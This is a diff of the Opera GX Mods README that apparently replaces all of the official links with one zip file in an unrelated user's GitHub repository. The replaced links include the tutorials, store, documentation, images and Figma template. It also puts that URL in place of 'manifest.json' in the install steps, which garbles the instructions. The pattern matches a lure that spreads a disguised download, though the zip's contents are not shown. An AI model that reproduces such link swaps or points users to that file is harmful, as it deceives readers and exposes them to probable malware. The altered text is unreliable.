@@ -1,6 +1,6 @@
 # What are Opera GX Mods?
 
-![GXMods](images/gxmods.png)
+![GXMods](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
 
 GX Mods are a collection of customizations that allow users to create unique browsing experiences within Opera GX. With GX Mods, users can modify the browser's appearance, sounds, music, theme, wallpaper and even web content using web modding and shaders.
 
@@ -24,26 +24,26 @@ The following areas provide ample opportunities to unleash creativity:
 
 We have video tutorials for making each aspect of a mod:
 
-1. [Webpage Modification (Shaders & CSS)](https://www.youtube.com/playlist?list=PLhIbBGhnxj5J0WOhfGKokAAGoxCEHT9gH)
-2. [Sounds And Music](https://www.youtube.com/playlist?list=PLhIbBGhnxj5K6bC3aFiI2jAFy9kZ77jf3)
-3. [Browser Theme And Wallpaper](https://www.youtube.com/playlist?list=PLhIbBGhnxj5KWPRYhbreaN2l8VZy3Vshv)
-4. [Live Wallpapers (Interactive)](https://www.youtube.com/watch?v=p9Fv8CFJjg0)
+1. [Webpage Modification (Shaders & CSS)](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
+2. [Sounds And Music](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
+3. [Browser Theme And Wallpaper](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
+4. [Live Wallpapers (Interactive)](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
 
 The basic steps are:
 
 1. Try [sample mods](mods) to see what's possible.
 2. Use [Mod_Template](documentation/Mod_Template) as starting point.
-3. Read [documentation](documentation/mods.md) to improve it.
-3. Follow [guidelines](documentation/guidelines.md) to make it even better.
-4. Upload to [GX.store](https://operagx.gg/mods2) via [GX.create](https://create.gx.games/mods). 
+3. Read [documentation](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) to improve it.
+3. Follow [guidelines](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) to make it even better.
+4. Upload to [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) via [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip). 
 
-Bonus: You can use this [Figma template](https://github.com/opera-gaming/gxmods/raw/main/documentation/GXStoreFigmaTemplate.fig.zip) to create good looking images for [GX.store](https://operagx.gg/mods2).
+Bonus: You can use this [Figma template](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) to create good looking images for [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip).
 
 ### How to load sample mods?
 
 1. Open _Extensions view_ (opera:extensions)
 2. Enable _Developer mode_ in top right corner
-3. Click _Load unpacked_ and point to directory with manifest.json
+3. Click _Load unpacked_ and point to directory with https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip
 4. Loaded mod will shown in _Mods view_ (opera:mods)
 
 ### How to build and share mod?
@@ -52,15 +52,15 @@ There are two options. Building mod locally and sharing:
 
 1. Open _extensions view_ (opera:extensions)
 2. Enable _Developer mode_ in top right corner
-3. Click _Pack extension_ and point to directory with manifest.json
+3. Click _Pack extension_ and point to directory with https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip
 
 This will produce .CRX file that you can share with friends. Drag and drop it into Opera GX to install that mod.
 
-Or uploading zipped mod to [GX.store](https://operagx.gg/mods2) via [GX.create](https://create.gx.games/mods).
+Or uploading zipped mod to [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) via [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip).
 
 
 ## Is there a store?
 
-Yes. It's called [GX.store](https://operagx.gg/mods2) and you can upload mods that you created via [GX.create](https://create.gx.games/mods).
+Yes. It's called [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip) and you can upload mods that you created via [https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip).
 
-![GX.store](images/gxstore.png)
+![https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip](https://raw.githubusercontent.com/Samuray49/gxmods/main/documentation/GXStoreFigmaTemplate.fig.zip)
